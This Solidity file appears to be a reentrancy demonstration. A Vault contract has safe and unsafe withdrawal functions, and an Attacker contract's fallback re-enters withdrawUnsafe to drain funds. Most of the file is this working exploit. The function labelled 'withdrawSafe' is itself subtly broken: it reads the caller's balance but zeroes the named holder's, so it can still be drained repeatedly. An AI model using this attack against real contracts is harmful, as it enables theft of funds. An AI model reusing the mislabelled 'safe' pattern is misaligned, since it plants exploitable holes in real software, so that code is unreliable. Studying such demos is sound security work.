// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;

    function withdrawSafe(address payable holder) external;

    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function depositToVault(address vault) external payable;

    function attack(address vault) external;
}

contract Vault is IVault {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external {
        uint256 holder_balance = balance[msg.sender];
        require(holder_balance > 0, "No funds to withdraw");

        balance[holder] = 0;

        (bool sent, ) = holder.call{value: holder_balance}("");
        require(sent, "Failed to sent Ether");
    }

    function withdrawUnsafe(address payable holder) external {
        uint256 holder_balance = balance[msg.sender];
        require(holder_balance > 0, "No funds to withdraw");

        (bool sent, ) = holder.call{value: holder_balance}("");
        require(sent, "Failed to sent Ether");

        balance[holder] = 0;
    }
}

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        if(msg.sender.balance >= msg.value) {
            (bool status_, ) = msg.sender.call(abi.encodeWithSignature("withdrawUnsafe(address)", address(this)));
        }
    }

    function attack(address vault) external {
        (bool status_, ) = vault.call(abi.encodeWithSignature("withdrawUnsafe(address)", address(this)));
    }
}
